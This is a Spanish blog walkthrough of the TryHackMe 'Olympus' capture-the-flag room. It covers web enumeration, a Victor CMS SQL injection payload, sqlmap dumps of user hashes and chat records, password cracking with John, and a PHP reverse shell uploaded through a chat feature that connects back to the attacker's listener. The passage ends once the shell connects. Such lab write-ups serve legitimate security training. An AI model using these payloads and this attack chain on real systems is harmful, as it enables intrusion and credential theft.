---
title: Try Hack Me - Olympus - Writeup
date: 2022-08-04 09:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a trabajar con la máquina [Olympus](https://tryhackme.com/room/olympusroom) disponible en [THM](https://tryhackme.com), un interesante CTF de dificultad media creado por [G4vr0ch3](https://tryhackme.com/p/G4vr0ch3) en el que pondremos en práctica técnicas de enumeración, SQLi y escalado de privilegios entre otras curiosidades.

Dentro música.

## Inicio

> **Disclaimer:** algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.

Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.

```console
┌──(ewan67㉿kali)-[~]
└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpn
```

Iniciamos la máquina remota dando al botón&nbsp;&nbsp;<code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code>

Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:

```console
┌──(ewan67㉿kali)-[~]
└─$ cd Cybersecurity/THM

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ mkdir Olympus

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ cd Olympus

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ touch notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ echo "Notas Olympus" > notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ cat notas
Notas Olympus
```

Con la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso:

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ LIP=10.18.xx.xx             <- la IP de mi equipo via OpenVPN

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ RIP=10.10.129.191           <- la IP de la máquina remota
```

## Reconocimiento & Enumeración

En el propio room nos sugiere el autor que empecemos enumerando el server así que vamos con ello.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ nmap -A $RIP -oN nmap_output
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

Abrimos el fichero con la salida de **nmap** en nuestro editor preferido y le echamos un ojo. Qué nos está contando ?

* que la máquina tiene dos puertos abiertos: el 22/tcp (ssh) y el 80/tcp (http).

* que corre un Ubuntu.

* que en el puerto 80 hay un Apache/2.4.41 (Ubuntu) escuchando con una redirección 302 contra *http://olympus.thm*

Probamos a cargar en el navegador la IP del server ...

![](/assets/posts/20220804/img01.png)

No rula. Se confirma la redirección. Toca modificar el fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code>&nbsp;&nbsp;de nuestro equipo para resolver la IP añadiendo la siguiente entrada.

```
10.10.129.191	olympus.thm
```

Volvemos a probar desde el navegador ...

![](/assets/posts/20220804/img02.png)

OK. Empezamos aplicando el procedimiento estandar de reconocimiento manual cuando nos enfrentamos a un sitio web, a saber:

* echamos un ojo a lo que nos muestra, seguimos enlaces, analizamos URLs, probamos funcionalidades, completamos formularios, lanzamos búsquedas, etc, etc; en resumen: trasteamos con él a ver qué nos dice. En nuestro caso no hay mucho donde rascar, pero la index incluye un mensaje que nos vale como primera pista:
> The old version of the website is still accessible on this domain.

* echamos un ojo al código fuente en busca de comentarios, formularios, nombre del framework, ficheros *.js* con contenido interesante como llamadas asíncronas, estructura de directorios a partir de los links, etc, etc.

* apuntamos todo lo que nos parezca relevante en nuestro fichero de bitácora *notas*.

Tras el reconocimiento manual, la artillería.

Para escanear el server tenemos varias herramientas a nuestra disposición: dirb, dirbuster, gobaster, nikto y un largo etc. En este caso vamos a utilizar dos de mis tools preferidas: **ffuf** y **feroxbuster**, ambas disponibles en el repositorio de Kali.

Empezamos con **ffuf** ...

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ ffuf -u http://olympus.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -t 100 -o ffuf_output -of md
```

Significado de las flags:

* `-u`&nbsp;: la URL que queremos escanear.
* `-w`&nbsp;: la ubicación del diccionario.
* `-c`&nbsp;: para colorear la salida.
* `-t`&nbsp;: nro de hilos concurrentes (por defecto son 40).
* `-o`&nbsp;: nombre del fichero donde almacenaremos la salida.
* `-of`&nbsp;: formato del fichero de salida, md en nuestro caso.

Abrimos el fichero y le echamos un ojo.

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : ffuf_output
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 41ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 45ms]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 35ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 46ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 57ms]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 45ms]
:: Progress: [4713/4713] :: Job [1/1] :: 1053 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Qué nos cuenta el fuzzeo ? ... el último directorio de la lista no es habitual, tendrá relación con lo el mensaje de la index *"The old version of the website ..."* ?

Vamos con **feroxbuster** ...

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ feroxbuster -u http://olympus.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 100 -o feroxbuster_output
```

Significado de las flags:

* `-u`&nbsp;: la URL que queremos escanear.
* `-w`&nbsp;: la ubicación de nuestro fichero de wordlist.
* `-e`&nbsp;: le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados.
* `-t`&nbsp;: nro de hilos concurrentes.
* `-o`&nbsp;: nombre del fichero donde almacenaremos la salida.

La velocidad y la cantidad de info que vuelca esta herramienta son una verdadera pasada, volviéndola una alternativa más que interesante a venerables clásicos del rock como dirb, gobuster y cía.

Echamos un ojo al fichero que nos ha generado.

```
[...]
301      GET        9l       28w      332c http://olympus.thm/~webmaster/admin/js/plugins => http://olympus.thm/~webmaster/admin/js/plugins/
301      GET        9l       28w      332c http://olympus.thm/~webmaster/admin/js/tinymce => http://olympus.thm/~webmaster/admin/js/tinymce/
[####################] - 42s    42708/42708   0s      found:129     errors:1189   
[####################] - 14s     4714/4714    328/s   http://olympus.thm/ 
[####################] - 19s     4714/4714    241/s   http://olympus.thm/javascript 
[####################] - 7s      4714/4714    0/s     http://olympus.thm/static/images/ => Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/static/ => Directory listing
[####################] - 7s      4714/4714    0/s     http://olympus.thm/static/images => Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/static => Directory listing
[####################] - 23s     4714/4714    204/s   http://olympus.thm/~webmaster 
[####################] - 29s     4714/4714    160/s   http://olympus.thm/~webmaster/admin 
[####################] - 22s     4714/4714    218/s   http://olympus.thm/javascript/jquery 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/css => Directory listing
[####################] - 15s     4714/4714    0/s     http://olympus.thm/~webmaster/fonts => Directory listing
[####################] - 4s      4714/4714    0/s     http://olympus.thm/~webmaster/fonts/material-icons => Directory listing
[####################] - 17s     4716/4714    285/s   http://olympus.thm/~webmaster/img 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/includes => Directory listing
[####################] - 10s     4714/4714    0/s     http://olympus.thm/~webmaster/admin/js/ => Directory listing
[####################] - 8s      4714/4714    0/s     http://olympus.thm/~webmaster/js => Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/includes/ => Directory listing
[####################] - 22s     4714/4714    215/s   http://olympus.thm/~webmaster/img/cgi-bin/ 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/css => Directory listing
[####################] - 2s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/fonts => Directory listing
[####################] - 1s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/img => Directory listing
[####################] - 1s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/includes => Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/css/ => Directory listing
[####################] - 16s     4714/4714    288/s   http://olympus.thm/~webmaster/admin/js 
[####################] - 14s     4714/4714    332/s   http://olympus.thm/~webmaster/ 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/js/ => Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/css/ => Directory listing
[####################] - 8s      4714/4714    0/s     http://olympus.thm/~webmaster/fonts/roboto => Directory listing
```

El directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">~webmaster</code>&nbsp;&nbsp;nos está llamando a gritos, así que vamos a ello.

Cargamos en el navegador la URL

```
http://olympus.thm/~webmaster
```

y accedemos a esto ...

![](/assets/posts/20220804/img03.png)

Bajamos hasta el final de la página ...

![](/assets/posts/20220804/img04.png)

Toca trastear. Sed buenos y hacedlo antes de continuar leyendo ;)

Qué info hemos conseguido ?

* El título de la página y la primera entrada del menú horizontal superior nos hablan de un tal **Victor`s CMS**. Búsqueda en Google y los primeros 6 resultados son un festín de vulnerabilidades, exploits y demás alegrías, tanto que cuesta enterarse de que se trata de *"A Simple Content Management System"* creado por [Victor Alagwu](https://github.com/VictorAlagwu/CMSsite).

* Pinchando en cualquiera del resto de opciones del menu superior nos carga la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/category.php</code>&nbsp;&nbsp;pasando un parametro GET <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">?cat_id=1</code>&nbsp;&nbsp;... ya veremos que se puede rascar de aquí.

* Si en el input del Search que aparece al final de la página metemos una sencilla comilla simple y le damos a buscar conseguimos que nos devuelva un error de SQL y parte de la query en cuestión en la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/search.php</code>&nbsp;. Menos da una piedra.

* Enviando el formulario de Login nos carga <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/includes/login.php</code>&nbsp;&nbsp;... una página en blanco con algo de info en el códido fuente.

Visto lo visto sobre nuestro amigo Victor, a por un exploit de primero.

## Análisis de vulnerabilidades

Buscamos en nuestro equipo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ searchsploit victor cms
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                         | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                             | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                   | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                                                                               | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                                                                             | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                   | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                                                                                 | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                             | php/webapps/49282.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

El segundo resultado nos refiere una posibilidad de SQLi sobre el parametro <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">cat_id</code>&nbsp;&nbsp;y nos remite al fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">php/webapps/48485.txt</code>&nbsp;&nbsp;para mas detalles.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ locate 48485.txt
/usr/share/exploitdb/exploits/php/webapps/48485.txt

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ cat /usr/usr/share/exploitdb/exploits/php/webapps/48485.txt
# Exploit Title: Victor CMS 1.0 - 'cat_id' SQL Injection
# Google Dork: N/A
# Date: 2020-05-19
# Exploit Author: Kishan Lal Choudhary
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0
# Tested on: Windows 10

Description: The GET parameter 'category.php?cat_id=' is vulnerable to SQL Injection

Payload: UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

http://localhost/category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

By exploiting the SQL Injection vulnerability by using the mentioned payload, an attacker will be able to retrieve the database name and version of mysql running on the server.   
```

El exploit nos cuenta que el CMS es vulnerable a SQLi y nos muestra el payload que podemos utilizar atacando al parametro GET <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">cat_id</code>&nbsp;&nbsp;de la URL.

Una opción es seguir el método de edición de URL que nos propone el exploit, otra a mi parecer más práctica y rápida: utilizar **sqlmap**.

> **Nota:** a partir de la información recopilada hasta aquí se nos presentan diversas vías para continuar avanzando. En nuestro caso, y en aras de la brevedad, solo nos centraremos en una. Otra opción con un recorrido similar, vinculada al input de búsqueda y la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/search.php</code>&nbsp;&nbsp;podéis consultarla [aquí](https://www.exploit-db.com/exploits/48734).

## Explotación

Vamos con **sqlmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' --dbs
```

Significado de las flags:

* `-u`&nbsp;: la URL target.
* `-p`&nbsp;: el parámetro que queremos atacar.
* `--dbs`&nbsp;: le pedimos que nos devuelva un listado de las Bases de Datos que encuentre.

Le damos amor y nos devuelve lo siguiente:

```
[...]
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
[...]
```

Candidata al Oscar la db *olympus*, así que a por sus tablas.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus --tables
```

Significado de las flags:

* `-D`&nbsp;: el nombre de la DB que queremos escanear.
* `--tables`&nbsp;: le pedimos que nos devuelva un listado de las tablas que encuentre.

```
[...]
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
[...]
```

De un primer vistazo la tabla *flag* promete felicidad, vamos a por ella.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T flag --columns
```

Significado de las flags:

* `-T`&nbsp;: el nombre de la tabla que queremos analizar.
* `--columns`&nbsp;: le pedimos que nos muestre la estructura de la tabla.

```
[...]
Database: olympus
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
[...]
```

Volcamos su contenido:

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T flag  --dump
```

Significado de las flags:

* `--dump`&nbsp;: nos vuelca los registros de la tabla.

```
[...]
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{xxxxxxxxxxxxxxxxxxx} |
+---------------------------+
[...]
```

Ha caído la primera.

Del listado de tablas que nos ha devuelto **sqlmap** solo hemos sacado partido a la tabla *flag*, así que vamos a por *user*.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T users  --columns
```

```
[...]
Database: olympus
Table: users
[9 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| randsalt       | varchar(255) |
| user_email     | varchar(255) |
| user_firstname | varchar(255) |
| user_id        | int          |
| user_image     | text         |
| user_lastname  | varchar(255) |
| user_name      | varchar(255) |
| user_password  | varchar(255) |
| user_role      | varchar(255) |
+----------------+--------------+
[...]
```

Nos traemos las columnas *user_name*, *user_password* y *user_email*

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T users  -C user_name,user_password,user_email --dump
```

Significado de las flags:

* `-C`&nbsp;: nos permite listar las columnas que nos queremos traer.

```
[...]
Database: olympus
Table: users
[3 entries]
+------------+--------------------------------------------------------------+------------------------+
| user_name  | user_password                                                | user_email             |
+------------+--------------------------------------------------------------+------------------------+
| prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus@olympus.thm |
| root       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root@chat.olympus.thm  |
| zeus       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus@chat.olympus.thm  |
+------------+--------------------------------------------------------------+------------------------+
[...]
```

Bien. Qué hemos conseguido ? Una relación de usuarios y hashes, guay. Pero qué más ? ... Mirad con atención las direcciones de correo. Bingo ! ... al parecer hay un subdominio en danza *chat.olympus.thm* ... existirá realmente ? ... estará operativo ? ... 

A saber, pero antes de salir de dudas a ese respecto y aprovechando que estamos con **sqlmap**, si revisamos nuestras notas veremos que hay una tabla *chats* dentro de la DB *olympus*. Vamos a volcarla a ver qué nos cuenta.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T chats  --dump
```

```
Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

```

Bien. El dump nos ofrece una conjunto de registros con mensajes y algunos datos interesantes:

* El usuario *prometheus* ha atacheado un fichero con el nombre *"prometheus_password.txt"*, pero al intentar descargarlo de la *"upload folder"*, no ha podido. Al parecer el fichero ha sufrido algun tipo de *"modificación"*.

* El usuario *zeus* le responde contándole que el *"IT guy"* ha implementado una función que modifica el nombre de los ficheros de manera aleatoria, antes de almacenarlos, con el objetivo de dificultar el acceso a posibles atacantes.

* Un nombre de fichero *"47c3210d51761686f3af40a875eeaaea.txt"* aparece asociado al registro del envío de *"prometheus_password.txt"*

Podemos deducir de lo anterior que el sitio implementa algun tipo de función que modifica el nombre del fichero adjuntado por el usuario antes de almacenarlo en la "*upload folder"*, y registra este nombre modificado en el campo *file* de la tabla *chats*.

Tareas ? ... acceder a *chat.olympus.thm*, localizar la *"upload folder"* y ver si nuestra teoría es cierta intentando descargar el fichero *"47c3210d51761686f3af40a875eeaaea.txt"*. De confirmarlo: podremos aprovecharnos de ello con bondad infinita.

Para confirmar que hay alguien escuchando en *chat.olympus.thm* via navegador lo primero es añadir la entrada correspondiente a nuestro <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code>

```
10.10.129.191	chat.olympus.thm
```

Se carga la página *chat.olympus.thm/login.php* con un vistoso formulario de Login.

![](/assets/posts/20220804/img07.png)

Guay, el sitio está operativo. Toca sacarle partido a los registros de la tabla *users* para intentar logarnos. Pasamos al siguiente nivel: Cracking.

## Cracking

A partir del volcado que tenemos de la tabla *users* creamos un fichero con los datos en formato ...

```
user:password
user:password
user:password
```

Lo guardamos con el nombre que queramos, por ejemplo <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">users.hashes</code>&nbsp;&nbsp;y recurrimos a nuestro fiel amigo **John The Ripper** utilizando <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/usr/share/wordlists/rockyou.txt</code>&nbsp;&nbsp;como diccionario.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt users.hashes
```

Tras un buen rato currando, **John** nos devuelve la respuesta. En este caso, solo ha podido resolver una de las claves.

```
[...]
0g 0:00:01:57 0.01% (ETA: 2022-08-08 04:10) 0g/s 18.98p/s 57.24c/s 57.24C/s allen..meandyou
xxxxxxxxxx       (prometheus)
1g 0:00:05:47 0.04% (ETA: 2022-08-07 06:07) 0.002875g/s 20.59p/s 52.89c/s 52.89C/s gomez..flower2
[...]
```

Con éstas credenciales en la mano toca intentar dos cosas:

1. Utilizarlas en el form de Login que viene al final de *http://olympus.thm/~webmaster/index.php*

2. Utilizarlas en el form de Login de *http://chat.olympus.thm/login.php*

## Enumeración II

Arrancamos con ...

![](/assets/posts/20220804/img05.png)

Probamos y accedemos al dashboard del CMS ...

![](/assets/posts/20220804/img06.png)

Toca trastear y ver lo que nos ofrece.

Probamos con la web del chat:

![](/assets/posts/20220804/img08.png)

Buena pinta. Una página en la que aparecen los mensajes almacenados en la tabla *chats*.

De las dos vías de avance que acabamos de abrir (el dashboard y el chat) vamos a trabajar con ésta última.

Según la hoja de ruta que nos hemos dado toca lozalizar la *"upload folder"* e intentar descargarnos el fichero *"47c3210d51761686f3af40a875eeaaea.txt"*. Tiramos de **feroxbuster** para la primer tarea.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ feroxbuster -u http://chat.olympus.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 100 -o feroxbuster_chat_output
[...]
[####################] - 18s    18880/18880   0s      found:28      errors:71     
[####################] - 15s     4714/4714    302/s   http://chat.olympus.thm/ 
[####################] - 9s      4714/4714    501/s   http://chat.olympus.thm/javascript 
[####################] - 7s      4714/4714    0/s     http://chat.olympus.thm/static => Directory listing
[####################] - 7s      4714/4714    657/s   http://chat.olympus.thm/javascript/jquery 
[####################] - 9s      4714/4714    515/s   http://chat.olympus.thm/uploads 
[####################] - 8s      4714/4714    0/s     http://chat.olympus.thm/static/images => Directory listing
```

Bien, el nombre de la "*upload folder*" parece ser ... *uploads* ... no se podía saber ;)

Intentamos descargarnos el fichero.

```
http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt
```

Qué os parece el mensaje que nos da ?

Cachondo el tío. Seguimos con nuestro plan y desde la vista del chat probamos a enviar un fichero .txt con una línea de texto cualquiera y el nombre *"a.txt"* por ejemplo. Lo enviámos y volvemos a sacar un volcado de la tabla *chats*

> **Tip:** si el dump no se actualiza añadir la flag `--flush-session` para refrescar la consulta.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T chats  --dump
[...]
Database: olympus
Table: chats
[5 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
| 2022-08-04 | prueba                                                                                                                                                          | <blank>                              | prometheus |
| 2022-08-04 | Attached : a.txt                                                                                                                                                | 012a4f36f3ba4e3c90e2606db849bfef.txt | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
```
Intentamos descargar el fichero que acabamos de subir utilizando el campo *file* del dump para ello

```
http://chat.olympus.thm/uploads/012a4f36f3ba4e3c90e2606db849bfef.txt
```

Vale, sospechas confirmadas. Nuevas tareas:

* Subir una shell inversa en php que utilizaremos para establecer una conexión entre el server y nuestro equipo local.

* Repetir el dump contra *chats* para obtener el nombre con el que se ha almacenado nuetro fichero con la shell.

* Arrancar una escucha en local con **netcat**

* Pedir el fichero al server para forzar la conexión.

Vamos a ello. Lo primero es localizar en nuestro Kali el fichero que necesitamos, copiarlo a nuestro directorio de trabajo y editarlo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ tree /usr/share/webshells/
/usr/share/webshells/
[...]
|-- php
|   |-- findsocket
|   |   |-- findsock.c
|   |   `-- php-findsock-shell.php
|   |-- php-backdoor.php
|   |-- php-reverse-shell.php
|   |-- qsd-php-backdoor.php
|   `-- simple-backdoor.php
[...]

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
```

Abrimos el fichero *php-reverse-shell.php* en nuestro editor y modificamos los parámetros necesarios

```
[...]
$ip = '10.18.xx.xx';  // CHANGE THIS    <- nuestra IP local
$port = 4321;       // CHANGE THIS      <- el puerto en el que estaremos escuchando
[...]
```

Subimos el fichero *php-reverse-shell.php* al server valiéndonos de la página de chat y volvemos a volcar *chats*

```
Database: olympus
Table: chats
[7 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
| 2022-08-04 | prueba                                                                                                                                                          | <blank>                              | prometheus |
| 2022-08-04 | Attached : a.txt                                                                                                                                                | 012a4f36f3ba4e3c90e2606db849bfef.txt | prometheus |
| 2022-08-04 | shell                                                                                                                                                           | <blank>                              | prometheus |
| 2022-08-04 | Attached : php-reverse-shell.php                                                                                                                                | 99e7c69732975b95791508afdabc5057.php | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

```

Abrimos una pestaña nueva en nuestro terminal e iniciamos **netcat**

```console
nc -lvnp 4321
```

Significado de las flags:

* `-l`&nbsp;: listen mode.
* `-v`&nbsp;: verbose.
* `-n`&nbsp;: solo IP numéricas, no DNS.
* `-p`&nbsp;: nro de puerto local.

Cargamos la shell desde el navegador con:

```
http://chat.olympus.thm/uploads/99e7c69732975b95791508afdabc5057.php
```

Confirmamos conexion

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.129.191] 46000
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 16:49:33 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
